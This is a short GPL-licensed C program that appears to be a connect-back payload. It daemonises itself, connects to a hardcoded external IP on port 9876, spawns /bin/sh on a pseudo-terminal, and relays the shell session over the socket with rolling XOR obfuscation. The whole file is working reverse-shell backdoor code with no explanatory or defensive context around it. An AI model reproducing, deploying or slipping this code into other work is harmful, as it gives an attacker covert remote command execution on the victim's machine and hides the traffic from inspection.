/**********************************************************************
 * Copyright (C) 2005-2006 (Jack Louis) <jack@rapturesecurity.org>    *
 *                                                                    *
 * This program is free software; you can redistribute it and/or      *
 * modify it under the terms of the GNU General Public License        *
 * as published by the Free Software Foundation; either               *
 * version 2 of the License, or (at your option) any later            *
 * version.                                                           *
 *                                                                    *
 * This program is distributed in the hope that it will be useful,    *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of     *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the      *
 * GNU General Public License for more details.                       *
 *                                                                    *
 * You should have received a copy of the GNU General Public License  *
 * along with this program; if not, write to the Free Software        *
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.          *
 **********************************************************************/
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/signal.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/poll.h>
#include <netinet/in.h>
#include <pty.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>

static void do_shell(void) {
	char *argz[2];

	argz[0]="sh";
	argz[1]=NULL;

	execve("/bin/sh", argz, NULL);
}

static pid_t frkpty(int *masterin, char *slavename) {
	int master, slave;
	pid_t chldp;

	if (openpty(&master, &slave, slavename, NULL, NULL) < 0) {
		_exit(1);
	}

	chldp=fork();
	if (chldp == -1) {
		_exit(1);
	}
	else if (chldp == 0) {
		close(master);
		setsid();
		if (ioctl(slave, TIOCSCTTY) < 0) {
			/*_exit(1);*/
		}
		/* dont really care what fails here */
		dup2(slave, 0);
		dup2(slave, 1);
		dup2(slave, 2);
		return 0;
	}
	else {
		*masterin=master;
		close(slave);
		return chldp;
	}
	exit(1);
}

static void handle_chld(int signo) {
	int status=0;

	wait(&status);

	exit(0);
}

int main(void) {
	int sock=0, master_in=0;
	socklen_t sl=0;
	struct sockaddr_in sin;
	pid_t chld=0, detach=0;
	char slave_name[128];
	struct pollfd fdz[2];
	char rbuf[1024];
	ssize_t rret=0;
	int pret=0, j=0;
	uint8_t rkey=0x41, wkey=0x41;

	if (inet_aton("204.8.140.164", &sin.sin_addr) < 0) {
		_exit(1);
	}

	sin.sin_family=AF_INET;
	sin.sin_port=htons(9876);

	detach=fork();
	if (detach == -1) {
		_exit(1);
	}
	else if (detach == 0) {
		setsid();
		chdir("/");
		fsync(1);
		for (j=0 ; j < 256 ; j++) {
			close(j);
		}
	}
	else {
		_exit(0);
	}

	sock=socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		_exit(1);
	}

	sl=sizeof(sin);
	if (connect(sock, (struct sockaddr *)&sin, sl) < 0) {
		_exit(1);
	}

	signal(SIGCHLD, handle_chld);

	chld=frkpty(&master_in, slave_name);
	if (chld == -1) {
		_exit(1);
	}
	else if (chld == 0) {
		do_shell();
	}
	else {

		while (1) {
again:
			fdz[0].fd=master_in;
			fdz[1].fd=sock;
			fdz[0].events=fdz[1].events=POLLIN|POLLPRI;
			fdz[0].revents=fdz[1].revents=0;
			pret=poll(&fdz[0], 2U, 500);
			if (pret < 0 && errno == EINTR) goto again;
			if (pret == 0) continue;

			if (fdz[0].revents) {
				rret=read(fdz[0].fd, rbuf, sizeof(rbuf));
				if (rret) {
					for (j=0 ; j < (size_t )rret ; j++) {
						rbuf[j] ^= rkey++;
					}
					write(fdz[1].fd, rbuf, (size_t)rret);
				}
			}
			else if (fdz[1].revents) {
				rret=read(fdz[1].fd, rbuf, sizeof(rbuf));
				if (rret) {
					for (j=0 ; j < (size_t )rret ; j++) {
						rbuf[j] ^= wkey++;
					}
					write(fdz[0].fd, rbuf, (size_t)rret);
				}
			}
		}
	}

	_exit(0);
}
